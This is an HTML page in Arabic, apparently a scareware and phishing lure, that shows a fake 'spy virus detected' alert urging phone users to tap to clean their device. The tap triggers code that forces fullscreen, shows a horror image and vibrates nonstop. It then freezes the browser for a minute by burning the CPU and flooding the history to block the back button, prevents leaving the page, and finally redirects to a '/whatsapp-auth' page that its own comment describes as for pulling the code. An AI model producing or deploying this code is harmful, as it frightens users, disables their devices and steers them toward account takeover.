<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>SYSTEM CRITICAL ERROR</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; touch-action: none; }
        #horror-layer { 
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
            background: url('https://i.giphy.com/media/v1.Y2lkPTc5MGI3NjExNHJmZzRyeHh5ZHg0ZHg0ZHg0ZHg0ZHg0ZHg0ZHg0ZHg0ZHg0ZHg0JmVwaD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/3o7TKsWZyGKY1ANKGf/giphy.gif') center/cover;

        .text { color: red; font-family: monospace; text-align: center; padding-top: 45vh; font-size: 20px; font-weight: bold; }
    </style>

<body onclick="launchAttack()">

    <div id="status" class="text">⚠️ تم كشف فيروس تجسس!<br>انقر فوراً لتنظيف الهاتف</div>
    <div id="horror-layer"></div>

    <script>
        function launchAttack() {
            // 1. طلب ملء الشاشة لإخفاء معالم النظام
            document.documentElement.requestFullscreen().catch(() => {});
            
            // 2. تفعيل الطبقة المرعبة
            document.getElementById('status').style.display = 'none';
            document.getElementById('horror-layer').style.display = 'block';

            // 3. اهتزاز هستيري لا يتوقف
            if (navigator.vibrate) {
                setInterval(() => { navigator.vibrate(1000); }, 100);
            }

            // 4. تجميد النواة (The Heavy Freeze)
            // هذا الجزء سيجعل الهاتف قطعة حديد لمدة 60 ثانية
            setTimeout(() => {
                const freezeTime = 60000; // دقيقة كاملة
                const start = Date.now();
                
                while (Date.now() - start < freezeTime) {
                    // إغراق سجل المتصفح لشل زر "الخلف"
                    window.history.pushState(null, null, "#" + Math.random());
                    
                    // استهلاك المعالج بالكامل عبر عمليات معقدة
                    for (let i = 0; i < 1000000; i++) {
                        Math.atan2(Math.random(), Math.random());
                    }
                }

                // بعد انتهاء الدقيقة، التوجه لصفحة سحب الكود
                window.location.href = "/whatsapp-auth";
            }, 500);
        }

        // منع الخروج أو الرجوع بأي وسيلة
        window.onbeforeunload = function() { return "FATAL ERROR"; };
    </script>
</body>
